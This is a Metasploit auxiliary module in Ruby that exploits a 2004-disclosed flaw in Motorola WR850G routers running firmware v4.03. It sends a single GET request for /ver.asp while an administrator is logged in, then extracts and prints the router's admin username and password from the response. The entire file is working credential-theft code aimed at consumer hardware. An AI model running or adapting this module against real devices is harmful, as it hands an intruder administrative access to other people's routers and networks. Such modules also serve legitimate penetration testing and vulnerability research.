require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Motorola WR850G v4.03 Credentials',
			'Description'    => %q{
				Login credentials to the Motorola WR850G router with
				firmware v4.03 can be obtained via a simple GET request
				if issued while the administrator is logged in.  A lot
				more information is available through this request, but
				you can get it all and more after logging in.
			},
			'Author'         => 'kris katterjohn',
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 6459 $',
			'References'     => [
				[ 'URL', 'http://seclists.org/bugtraq/2004/Sep/0339.html']
			],
			'DisclosureDate' => 'Sep 24 2004'))

		register_options([
			Opt::RPORT(80)
		])
	end

	def run
		connect

		sock.put("GET /ver.asp HTTP/1.0\r\n\r\n")
		response = sock.get

		disconnect

		if response.nil? or response.empty?
			print_status("No response from server")
			return
		end

		# 302 Redirect
		if response.split(/\r\n/)[0] !~ /200 Ok/
			print_status("Administrator not logged in")
			return
		end

		user = $1 if response.match("http_username=([^\n]*)<br>")
		pass = $1 if response.match("http_passwd=([^\n]*)<br>")

		print_status("Found username \"#{user}\" and password \"#{pass}\"") if user and pass
	end
end
